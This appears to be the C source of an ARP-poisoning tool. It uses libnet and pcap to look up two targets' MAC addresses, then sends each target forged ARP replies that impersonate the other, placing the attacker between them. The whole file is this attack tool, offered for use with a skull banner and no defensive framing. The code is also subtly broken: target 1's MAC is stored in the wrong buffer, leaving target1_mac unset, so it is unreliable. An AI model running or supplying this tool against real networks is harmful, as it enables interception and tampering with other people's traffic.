#include "header/arp.h"
#include <pcap.h>
#include "header/hacking.h"

void set_packet_filter(pcap_t *handle);

void usage(char* name)
{
    printf("Usage: %s <IP of Target A> <IP of Target B>\n", name);
    exit(0);
}

char pic[] =
"                      ______\n"
"                   .-"      "-.\n"
"                  /           \\\n"
"                 |              |\n"
"                 |,  .-.  .-.  ,|\n"
"                 | )(_\e[0;31mo\033[39m/  \\\e[0;31mo\033[39m_)( |\n"
"                 |/     /\\     \\|\n"
"       (@_       (_     ^^     _)\n"
"  _     ) \\_______\\__|IIIIII|__/__________________________\n"
" (_)@8@8{}<________|-\\IIIIII/-|___________________________>\n"
"        )_/        \\          /\n"
"       (@           `--------`\n";


int main(int argc, char *argv[])
{
    libnet_t *l;
    pcap_t *handle;
    pcap_if_t *ift;

    u_char errbuf[LIBNET_ERRBUF_SIZE];

    uint32_t target1_ip;
    uint32_t target2_ip;

    uint8_t *target1_mac;
    uint8_t *target2_mac;

    if(argc < 3)
        usage(argv[0]);

    /* Allocate memory for target macs*/
    target1_mac = ec_malloc(6);
    target2_mac = ec_malloc(6);

    l = libnet_init(LIBNET_LINK, NULL, errbuf);
    if(l == NULL)
        libnet_fatal(libnet_geterror(l));
    
    // Get device name
    if(pcap_findalldevs(&ift, (char *)(&errbuf)) == -1)
        fatal("suchen von Netzwerkgeräten");
    
    // Convert Targets ASCII-IP's to Numbers
    if(((target1_ip = libnet_name2addr4(l, argv[1], LIBNET_DONT_RESOLVE)) ==  -1) 
    || ((target2_ip = libnet_name2addr4(l, argv[2], LIBNET_DONT_RESOLVE)) ==  -1))
        fatal(libnet_geterror(l));
    
    

    printf("Netzwerkschnittstelle ist %s\n", ift->name);
    

     /* Open device for live capture */
     handle = pcap_open_live(ift->name, 4096, 1, 100, errbuf);
     if(handle == NULL)
        fatal("opening live session");
    
    /* 
        Get MAC-Addresses from Targets 
    */

    // Set packet filter for incoming ARP-Packets
    set_packet_filter(handle);
    
    // Request Target 1
    printf("\nZiel \033[32m#1\033[39m: sende ARP-requests... \n");
    arp_request(target1_ip, l);

    // Receive Target 1
    printf("Ziel \033[32m#1\033[39m: suche nach ARP-replys...\n");

    /* Loop goes on until a matching ARP-reply is found */

    while(arp_receive(handle, target1_ip, target2_mac) != 0) arp_request(target1_ip, l);
    
    printf("\033[33m\n-------------------------------\033[39m\n\n");

    // Request Target 2
    printf("Ziel \033[34m#2\033[39m: sende ARP-requests... \n");
    arp_request(target2_ip, l);

    // Receive Target 2
    printf("Ziel \033[34m#2\033[39m: suche nach ARP-replys...\n");
    while(arp_receive(handle, target2_ip, target2_mac) != 0) arp_request(target2_ip, l);

    /* 
        Start ARP-Poisoning
    */

    printf("\n\t\tStarte ARP-Poisoning\n%s", pic);

    // send a fake arp-reply to target 1 pretending to be target 2
    arp_reply(target2_ip, target1_ip, target1_mac, l);

   // send a fake arp-reply to target 2 pretending to be target 1
    arp_reply(target1_ip, target2_ip, target2_mac, l);

}

void set_packet_filter(pcap_t *handle)
{
    struct bpf_program filter;
    char filter_string[200];
    sprintf(filter_string, "arp");
    printf("[DEBUG] filter string ist %s\n", filter_string);

    if(pcap_compile(handle, &filter, filter_string, 0, 0) == -1)
    {
        perror("compile filter error");
        exit(EXIT_FAILURE);
    }

    if(pcap_setfilter(handle, &filter) == -1)
    {
        perror("setting filter error");
        exit(EXIT_FAILURE);
    }

}